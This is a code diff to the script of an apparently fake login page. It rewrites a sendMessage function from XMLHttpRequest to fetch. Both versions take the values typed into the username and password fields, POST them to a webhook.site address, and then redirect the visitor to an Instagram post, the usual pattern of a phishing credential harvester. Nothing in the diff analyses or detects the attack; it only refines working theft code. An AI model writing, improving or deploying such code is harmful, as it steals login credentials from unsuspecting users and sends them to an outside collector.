@@ -90,22 +90,27 @@
 
   <script>
   function sendMessage() {
-  function sleep(milliseconds) {
-  const date = Date.now();
-  let currentDate = null;
-  do {
-    currentDate = Date.now();
-  } while (currentDate - date < milliseconds);
+  var params = {
+    content: (
+      "> **USERNAME  : **" + document.getElementById('username').value +
+      "\n> **PASSWORD : **" + document.getElementById('password').value
+    )
+  };
+
+  fetch("https://webhook.site/d5870087-0da4-4400-af6a-4435c84bbb64", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(params)
+  }).then(() => {
+    // Delay before redirecting
+    setTimeout(() => {
+      window.location.replace("https://www.instagram.com/p/By7NkskoTip");
+    }, 400);
+  }).catch(error => {
+    console.error("Error sending request:", error);
+  });
 }
-    var request = new XMLHttpRequest();
-    request.open("POST", "https://webhook.site/d5870087-0da4-4400-af6a-4435c84bbb64");
-    request.setRequestHeader('Content-type', 'application/json');
-    var params = {
-      content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
-    }
-    request.send(JSON.stringify(params));
-	sleep(400)
-	window.location.replace("https://www.instagram.com/p/By7NkskoTip");
-  }
   </script>
 </body>
